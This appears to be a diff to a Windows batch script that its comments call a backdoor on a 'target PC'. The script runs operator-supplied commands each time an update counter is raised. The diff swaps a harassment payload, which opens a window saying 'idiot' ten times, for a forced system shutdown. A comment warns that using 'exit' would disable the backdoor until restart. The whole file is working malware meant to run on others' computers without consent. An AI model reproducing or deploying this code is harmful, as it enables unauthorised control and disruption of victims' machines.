@@ -3,24 +3,11 @@ set number=1
   set /p number=
 )
 :: ADD 1 TO UPDATE TO RUN THE CODE ::
-set update=3
+set update=4
 if %number% equ %update% (goto end)
 :: do not use the command exit, this will dissabled the backdoor on the target PC untill it is restarted
 :: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-echo idiot >idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-start idiot.txt
-timeout 3 
-del idiot.txt
-
+shutdown /s
 :: END CODE HERE ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 echo %update% >run.sav
 :end
